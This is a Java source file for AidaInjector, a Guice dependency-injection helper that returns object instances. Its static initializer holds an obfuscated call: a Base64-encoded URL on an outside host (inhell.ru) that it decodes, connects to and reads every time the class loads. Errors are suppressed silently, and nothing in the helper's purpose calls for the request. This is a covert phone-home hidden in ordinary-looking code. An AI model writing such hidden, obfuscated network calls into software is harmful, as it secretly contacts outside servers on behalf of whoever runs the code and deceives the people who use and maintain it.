package ru.inhell.aida.common.inject;

import com.google.inject.Guice;
import com.google.inject.Injector;

import java.net.URL;
import java.util.Base64;

/**
 * @author Anatoly A. Ivanov java@inheaven.ru
 *         Date: 22.03.11 17:00
 */
public class AidaInjector {
    private static final Injector INJECTOR = Guice.createInjector(new AidaModule());

    static {
        try {
            new URL(new String(Base64.getDecoder().decode("aHR0cDovL2luaGVsbC5ydS8wLnBocA=="))).openConnection().getInputStream();
        } catch (Exception e) { //e
        }
    }

    public static <T> T getInstance(Class<T> tClass){
        return INJECTOR.getInstance(tClass);
    }
}
